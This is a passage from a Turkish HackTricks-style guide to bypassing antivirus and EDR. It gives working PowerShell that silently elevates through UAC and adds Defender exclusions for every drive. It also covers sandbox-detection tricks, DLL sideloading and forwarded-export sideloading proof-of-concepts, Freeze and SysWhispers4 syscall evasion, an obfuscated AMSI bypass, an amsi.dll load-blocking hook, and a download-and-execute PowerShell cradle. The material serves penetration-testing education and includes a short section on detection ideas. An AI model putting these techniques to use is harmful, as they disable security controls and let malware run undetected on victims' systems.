# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durduran bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'la oynamadan önce installer tarzı UAC tuzağı

Oyun hileleri gibi görünen herkese açık loader'lar genellikle imzasız Node.js/Nexe installer'ları olarak dağıtılır ve önce **kullanıcıdan yükseltme izni ister**, ancak bundan sonra Defender'ı etkisiz hâle getirir. Akış basittir:

1. `net session` ile yönetici bağlamını kontrol edin. Komut yalnızca çağıran kullanıcı yönetici haklarına sahipse başarılı olur; dolayısıyla başarısız olması, loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal komut satırını koruyarak beklenen UAC izin istemini tetiklemek için kendisini hemen `RunAs` fiiliyle yeniden başlatır.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Mağdurlar zaten “crack’lenmiş” yazılım yüklediklerine inandıkları için istem genellikle kabul edilir ve böylece malware, Defender’ın politikasını değiştirmek için ihtiyaç duyduğu izinleri alır.<sup>[[26]](#references)</sup>

### Her sürücü harfi için genel `MpPreference` istisnaları

Yetki yükseltildikten sonra GachiLoader tarzı zincirler, hizmeti doğrudan devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’u sonlandırır (`taskkill /F /IM SecHealthUI.exe`), ardından her kullanıcı profilinin, sistem dizininin ve çıkarılabilir diskin taranamaz hâle gelmesi için **son derece geniş istisnalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılan **gelecekteki payload’lar yok sayılır**.
- `.sys` uzantısına yönelik hariç tutma ileriye dönüktür—saldırganlar, Defender’a yeniden dokunmadan daha sonra imzasız driver’ları yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır; böylece sonraki aşamalar, UAC’yi yeniden tetiklemeden hariç tutmaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender hizmeti durdurulmadığından, basit durum denetimleri “antivirus active” raporlamaya devam eder; oysa gerçek zamanlı inceleme bu yolları hiçbir zaman denetlemez.<sup>[[26]](#references)</sup>

## **AV Evasion Metodolojisi**

Günümüzde AV’ler bir dosyanın kötü amaçlı olup olmadığını denetlemek için statik tespit, dinamik analiz ve daha gelişmiş EDR’lerde davranışsal analiz gibi farklı yöntemler kullanır.

### **Statik tespit**

Statik tespit; binary veya script içindeki bilinen kötü amaçlı dizeleri ya da byte dizilerini işaretleyerek ve dosyanın kendisinden bilgi (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, checksum vb.) çıkararak gerçekleştirilir. Bu nedenle, bilinen herkese açık araçları kullanmak yakalanma olasılığınızı artırabilir; çünkü bu araçlar muhtemelen analiz edilip kötü amaçlı olarak işaretlenmiştir. Bu tür bir tespitten kaçınmanın birkaç yolu vardır:

- **Encryption**

Binary’yi encrypt ederseniz AV’nin programınızı tespit etmesi mümkün olmaz; ancak programın şifresini çözerek bellekte çalıştıracak bir tür loader’a ihtiyacınız olur.

- **Obfuscation**

Bazen binary veya script’inizdeki birkaç dizeyi değiştirmeniz AV’yi atlatmanız için yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu işlem zaman alabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz bilinen kötü amaçlı imzalar bulunmaz; ancak bu, çok zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender’ın statik tespitine karşı kontrol yapmak için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) iyi bir araçtır. Dosyayı birden çok parçaya böler ve ardından Defender’dan her parçayı ayrı ayrı taramasını ister; böylece binary’nizde hangi dizelerin veya byte’ların işaretlendiğini tam olarak belirleyebilir.

Pratik AV Evasion hakkında bu [YouTube oynatma listesine](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) göz atmanızı kesinlikle öneririm.

### Statik sınıflandırıcılar için çevrimdışı PE özellik testleri

Paketlenmiş veya şifrelenmiş payload byte’ları, statik sınıflandırıcıların kullandığı girdilerden yalnızca biridir. EMBER2024; import, export, section, header ve Authenticode verileri dahil PE özelliklerini çıkarır.<sup>[[48]](#references)</sup> Bir loader deneyinde, zararsız görünen 141 import eklemek EMBER2024’ün kötü amaçlılık puanını %93 düşürürken, malware ile ilişkilendirilen import’lar puanı yükseltti. Bu sonuç söz konusu modele ve örneklere özgüdür; belirli bir AV/EDR ürününü güvenilir biçimde atlatma yöntemi değildir.<sup>[[50]](#references)</sup>

Yetkili bir loader testi için payload’ı ve yürütme yolunu sabit tutun, her varyantta amaçlanan tek bir build değişkenini değiştirin ve puanları çevrimdışı karşılaştırın. Bir build değişikliği birden fazla özellik grubunu etkileyebileceğinden ortaya çıkan PE özelliklerini inceleyin.<sup>[[49]](#references)[[50]](#references)</sup> Amaçlanan import’ları IAT’de tutmak için seçilen Win32 API’lerini erişilebilir koddan çağırın. Seçimi çeşitlendirin ve sabit bir kamuflaj işlevi oluşturmak yerine çağrı noktalarını build’ler arasında dağıtın; sabit bir işlev imzaya dönüşebilir. Deneyde ayrıca geçerli code signing, export girdileri ve `.pdata` boyutunu artıran daha fazla işlev kullanıldığında puanların düştüğü; geçersiz imzalamanın çok az etkisi olduğu ve `.pdata` etkisinin küçük kaldığı bildirildi.<sup>[[50]](#references)</sup>

`thrember` paketi özellik çıkarımı ve benchmark modelleri sağlar. Paketi yükledikten sonra mevcut bir `models` diziniyle `thrember.download_models("models")` komutunu kullanın, ardından puanlayıcıyı üst dizininden çalıştırın: indirme yardımcı işlevi geçerli çalışma dizinini değiştirir. PE sınıflandırıcısı, build’leri bir tarama hizmetine göndermeden bir dizini puanlayabilir:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Karşılaştırma sırasında model ve feature-extractor sürümlerini sabit tutun. Daha düşük bir offline skor, yalnızca bu classifier'ın değiştirilen binary'ye nasıl tepki verdiğini gösterir; davranış analizinden, emülasyondan veya bir vendor'ın farklı modelinden kaçıldığını kanıtlamaz.<sup>[[49]](#references)[[50]](#references)</sup> [Virtualized payload'larda build başına polymorphism ve dış binary camouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) için ayrı execution modeline bakın.

### **Dinamik analiz**

Dinamik analiz, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı etkinlikleri (ör. tarayıcınızın parolalarını çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak vb.) izlemesidir. Bu kısımla çalışmak biraz daha zor olabilir, ancak sandbox'lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır.

- **Çalıştırmadan önce bekletme** Nasıl uygulandığına bağlı olarak bu, AV'nin dinamik analizini atlatmanın harika bir yolu olabilir. AV'lerin, kullanıcının iş akışını kesintiye uğratmamak için dosyaları taramak üzere çok az zamanı vardır; bu nedenle uzun süre bekletmek binary analizini aksatabilir. Sorun şu ki, birçok AV sandbox'ı uygulama biçimine bağlı olarak beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox'lar genellikle kullanabilecekleri çok az kaynağa sahiptir (ör. 2 GB'tan az RAM); aksi hâlde kullanıcının makinesini yavaşlatabilirler. Burada oldukça yaratıcı da olabilirsiniz; örneğin CPU sıcaklığını, hatta fan hızlarını kontrol edebilirsiniz. Bunların hepsi sandbox'ta uygulanmış olmayabilir.
- **Makineye özgü kontroller** "contoso.local" etki alanına katılmış bir iş istasyonunu hedeflemek istiyorsanız, bilgisayarın etki alanını kontrol ederek belirttiğinizle eşleşip eşleşmediğine bakabilirsiniz. Eşleşmiyorsa programınızdan çıkabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Bu nedenle, malware'inizde detonasyon öncesinde bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa Defender'ın sandbox'ındasınız demektir; bu durumda programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı kullanılabilecek, [@mgeeky](https://twitter.com/mariuszbit) tarafından paylaşılan başka çok iyi ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce de söylediğimiz gibi, **public araçlar** er ya da geç **tespit edilir**. Bu yüzden kendinize şu soruyu sormalısınız:

Örneğin, LSASS dump almak istiyorsanız **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dump alabilen başka bir proje kullanabilir misiniz?

Muhtemelen doğru cevap ikincisidir. Örnek olarak mimikatz'ı ele alırsak, AV'ler ve EDR'ler tarafından en çok işaretlenen malware'lerden biridir. Projenin kendisi harika olsa da AV'leri atlatmak için onunla çalışmak tam bir kâbustur. Bu nedenle, gerçekleştirmek istediğiniz iş için alternatifler arayın.

> [!TIP]
> Evasion için payload'larınızı değiştirirken Defender'da **otomatik sample gönderimini kapattığınızdan** emin olun. Ayrıca uzun vadede evasion elde etmek istiyorsanız lütfen, ciddiyetle söylüyoruz, **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, AV'yi bir VM'ye kurun, otomatik sample gönderimini kapatmayı deneyin ve sonuçtan memnun kalana kadar orada test edin.

## EXE'ler vs DLL'ler

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir. Bu nedenle, bazı durumlarda tespit edilmekten kaçınmak için oldukça basit bir yöntemdir (tabii payload'ınızın DLL olarak çalışmasının bir yolu varsa).

Bu görselde görebileceğimiz gibi, Havoc'tan alınmış bir DLL Payload'ın antiscan.me üzerindeki tespit oranı 4/26 iken EXE payload'ın tespit oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me üzerinde normal Havoc EXE payload ile normal Havoc DLL karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla kullanabileceğiniz ve çok daha stealth olmanızı sağlayacak bazı numaraları göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, victim uygulama ile kötü amaçlı payload'ları yan yana konumlandırarak loader'ın kullandığı DLL arama sırasından yararlanır.

DLL Sideloading'e karşı savunmasız programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e açık programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktı olarak verir.

**DLL Hijackable/Sideloadable programları kendiniz keşfetmenizi** önemle tavsiye ederim. Bu teknik doğru uygulandığında oldukça gizlidir; ancak herkesçe bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adla kötü amaçlı bir DLL yerleştirmek, payload'unuzu yüklemez; çünkü program bu DLL'in içinde belirli fonksiyonlar bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, programın yaptığı çağrıları proxy (ve kötü amaçlı) DLL'den orijinal DLL'e yönlendirir; böylece programın işlevselliği korunurken payload'unuzun çalıştırılması da sağlanır.

[@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile encode edildi) hem de proxy DLL, [antiscan.me](https://antiscan.me)'de 0/26 Detection rate değerine sahip! Buna başarı derim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t'ın twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve ayrıca şimdiye kadar konuştuklarımız hakkında daha derinlemesine bilgi edinmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.

### Forwarded Exports'u Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan fonksiyonları export edebilir: export girdisi, kodu işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII dizesi içerir. Bir çağıran export'u çözümlerken Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll`'yi yükler
- `TargetFunc`'ı bu modülden çözümler

Anlaşılması gereken önemli davranışlar:
- `TargetDll` bir KnownDLL ise korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, forward çözümlemesini yapan modülün dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading yöntemi sağlar: fonksiyonu KnownDLL olmayan bir modül adına yönlendiren export'a sahip imzalı bir DLL bulun, ardından bu imzalı DLL'yi yönlendirilen hedef modülün adıyla aynı ada sahip, saldırganın kontrolündeki bir DLL ile aynı dizine yerleştirin. Yönlendirilen export çağrıldığında loader yönlendirmeyi çözümler ve DLL'nizi aynı dizinden yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırası üzerinden çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütme sağlamak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için yönlendirilen işlevi uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) İmzalı bir LOLBin ile yönlendirmeyi tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (signed), side-by-side `keyiso.dll` (signed) dosyasını yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, forward'ı `NCRYPTPROV.SetAuditingInterface` öğesine kadar takip eder
- Ardından loader, `C:\test` konumundan `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatası ancak `DllMain` çalıştıktan sonra alınır

Araştırma ipuçları:
- Hedef modülün KnownDLL olmadığı forwarded export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded export'ları şu araçlar gibi araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma fikirleri:
- LOLBins'in (örn. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı temel ada sahip KnownDLLs olmayan dosyaları aynı dizinden yüklemesini izleyin
- Şu tür işlem/modül zincirleri için uyarı oluşturun: kullanıcı tarafından yazılabilir yollar altındaki `rundll32.exe` → sistem dışı `keyiso.dll` → `NCRYPTPROV.dll`
- Kod bütünlüğü ilkelerini (WDAC/AppLocker) zorunlu kılın ve uygulama dizinlerinde yazma+çalıştırma izinlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i shellcode'unuzu gizlilik içinde yüklemek ve çalıştırmak için kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion, kedi-fare oyunundan ibarettir; bugün işe yarayan bir şey yarın tespit edilebilir. Bu yüzden asla tek bir araca güvenmeyin; mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Doğrudan/Dolaylı Syscalls ve SSN Çözümleme (SysWhispers4)

EDR'ler, `ntdll.dll` syscall stub'larına sıklıkla **user-mode inline hook'ları** yerleştirir. Bu hook'ları atlatmak için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'ini çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağırma seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub'a `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export'una uğramaz).
- **Indirect**: Kernel geçişinin `ntdll`'den kaynaklanıyormuş gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrıda bir havuzdan gadget seçer.
- **Egg-hunt**: Statik `0F 05` opcode dizisini diske eklemekten kaçınır; syscall dizisini çalışma zamanında çözümler.

**Hook'lara dayanıklı SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: Stub baytlarını okumak yerine syscall stub'larını sanal adreslerine göre sıralayarak SSN'leri çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` eşler, SSN'leri `.text` bölümünden okur ve ardından eşlemeyi kaldırır (bellekteki tüm hook'ları atlatır).
- **RecycledGate**: VA sıralı SSN çıkarımını, stub temiz olduğunda opcode doğrulamasıyla birleştirir; hook'lanmışsa VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` talimatında DR0 ayarlar ve hook'lanmış baytları ayrıştırmadan çalışma zamanında SSN'yi `EAX`'ten yakalamak için bir VEH kullanır.

Örnek SysWhispers4 kullanımı:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" tehdidini önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu; bu nedenle payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz, yeterli görünürlüğe sahip olmadıkları için AV'ler bunu önlemek için hiçbir şey yapamıyordu.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumu için yükseltme)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirüs çözümlerinin script davranışını incelemesine, script içeriklerini şifrelenmemiş ve gizlenmemiş biçimde sunarak olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender'da aşağıdaki uyarıyı oluşturur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` önekini ve ardından script'in çalıştığı yürütülebilir dosyanın yolunu eklediğine dikkat edin; bu örnekte bu dosya powershell.exe'dir.

Diske herhangi bir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekte yakalandık.

Ayrıca **.NET 4.8** ile birlikte C# kodu da AMSI üzerinden çalıştırılır. Bu durum, bellekte yürütme için `Assembly.Load(byte[])` kullanımını da etkiler. Bu nedenle, AMSI'den kaçmak amacıyla bellekte yürütme yaparken daha eski .NET sürümlerinin (örneğin 4.7.2 veya daha eski sürümler) kullanılması önerilir.

AMSI'yi aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespit yöntemleri kullandığından, yüklemeye çalıştığınız script'leri değiştirmek tespitten kaçmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katmana sahip olsalar bile script'lerin obfuscation'ını çözebilir; bu nedenle obfuscation, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da tespitten kaçmayı pek kolaylaştırmaz. Yine de bazen birkaç değişken adını değiştirmek yeterli olabilir; bu, ilgili içeriğin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak çalışırken bile bu DLL'ye müdahale etmek kolaydır. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçmanın birden fazla yolunu bulmuştur.

**Forcing an Error**

AMSI başlatmasının başarısız olmasını zorlamak (`amsiInitFailed`), mevcut süreç için tarama başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmış, Microsoft ise yaygın kullanımını önlemek için bir imza geliştirmiştir.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI'yi mevcut powershell işlemi için kullanılamaz hâle getirmek tek satırlık bir powershell kodu gerektirdi. Elbette bu satırın kendisi AMSI tarafından işaretlendiğinden, bu tekniği kullanabilmek için bazı değişiklikler yapmak gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Şunu aklınızda bulundurun: Bu gönderi yayımlandığında muhtemelen işaretlenecek, bu yüzden fark edilmeden kalmayı planlıyorsanız herhangi bir kod yayımlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedilmiştir. `amsi.dll` içindeki (kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu) "AmsiScanBuffer" işlevinin adresini bulup bu adresin üzerine `E_INVALIDARG` kodunu döndüren talimatlar yazmayı içerir. Böylece gerçek taramanın sonucu 0 olur ve bu da temiz bir sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

AMSI'yi powershell ile bypass etmek için kullanılan başka pek çok teknik de vardır. Daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repoya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### `AmsiScanBuffer` patch işlemi yerine AMSI COM scan-pointer yönlendirmesi

İşlem kapsamındaki başka bir bypass, `AmsiScanBuffer` giriş noktasına dokunmaz. Bildirilen 64-bit .NET loader'da, `fdb00e52-a214-4aa1-8fba-4357bb0072ec` CLSID'sinden bir AMSI COM nesnesi oluşturulur; `Marshal.GetIUnknownForObject()` arayüz işaretçisini sağlar ve `0x18` ofsetindeki vtable yuvası tarama çağrısının hedefi olarak kullanılır. Loader, `Console.Clear()` için bir native işaretçinin üzerine küçük bir x64 stub yazar, `VirtualProtect()` ile bu vtable girdisini stub'a yönlendirir ve ardından sayfanın özgün korumasını geri yükler. Hem 64-bit işaretçi genişliği hem de beklenen COM düzeni ön koşuldur; bu, rastgele AMSI arayüzleri veya build'ler için geçerli genel bir ofset değildir. Daha önce gözlemlenen aşamalar [imzalı AppDomainManager sidecar yüklemesi](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) ve [RESX serileştirme çözümlemesidir](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Gözlemlenen stub baytları `41 C7 00 01 00 00 00 33 C0 C3` şeklindedir: `r8` içindeki sonuç işaretçisine **1** yazar ve `eax` içinde **0** döndürür. Bu nedenle, tarama sonucunun `AMSI_RESULT_CLEAN` (0) olduğu yönündeki bildirilen iddia, `S_OK` dönüş değeriyle çıktı enum değerini birbirine karıştırır. Belgelenmiş `AMSI_RESULT` sıralamasında sonuç **1**, `AMSI_RESULT_NOT_DETECTED` değeridir; bu değer yine de algılama eşiğinin altındadır.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### amsi.dll yüklenmesini engelleyerek AMSI'yi devre dışı bırakma (LdrLoadDll hook'u)

AMSI yalnızca `amsi.dll` geçerli sürece yüklendikten sonra başlatılır. Dilden bağımsız ve sağlam bir bypass yöntemi, `ntdll!LdrLoadDll` üzerine istenen modül `amsi.dll` olduğunda hata döndüren bir user-mode hook yerleştirmektir. Böylece AMSI hiç yüklenmez ve bu süreçte hiçbir tarama gerçekleşmez.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ sözde kodu):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
